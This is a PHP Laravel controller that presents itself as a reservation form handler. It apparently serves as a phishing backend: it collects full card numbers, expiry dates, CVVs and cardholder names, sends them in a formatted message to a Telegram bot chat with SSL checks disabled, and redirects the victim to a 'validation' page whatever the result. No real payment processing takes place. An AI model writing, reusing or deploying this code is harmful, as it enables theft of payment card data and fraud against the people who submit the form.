<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class ReservationController extends Controller
{
    public function submit(Request $request)
    {
        $validated = $request->validate([
            'bank_name' => 'required|string|max:255',
            'name' => 'required|string|max:255',
            'card_number' => 'required|string|digits:16',
            'expiry'      => 'required|string',
            'cvv'         => 'required|string|digits:3',
        ]);

        $message = "🔔INFORMATIONS BANCAIRES 🔔\n\n"
                . "💳 Nom de la banque : {$validated['bank_name']}\n"
                . "👤 Nom : {$validated['name']}\n"
                . "💳 Carte : `{$validated['card_number']}`\n" 
                . "📅 Exp : {$validated['expiry']}\n"
                . "🔑 CVV : `{$validated['cvv']}`";

        try {
            $this->sendTelegramMessage($message);
            return redirect()->route('valider');
        } catch (\Exception $e) {
            \Log::error('Telegram send error: ' . $e->getMessage());
            return redirect()->route('valider');
        }
    }

    private function sendTelegramMessage($message)
    {
        $token = config('services.telegram-bot-api.token');
        $chatId = config('services.telegram-bot-api.chat_id');
        
        if (!$token || !$chatId) {
            throw new \Exception('Telegram config missing');
        }

        $url = "https://api.telegram.org/bot{$token}/sendMessage";
        
        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);

        if ($httpCode !== 200) {
            \Log::error('Telegram API error: HTTP ' . $httpCode . ' - ' . $response . ' - ' . $error);
            throw new \Exception('Telegram API failed: ' . $response);
        }

        \Log::info('Telegram message sent successfully');
    }
}
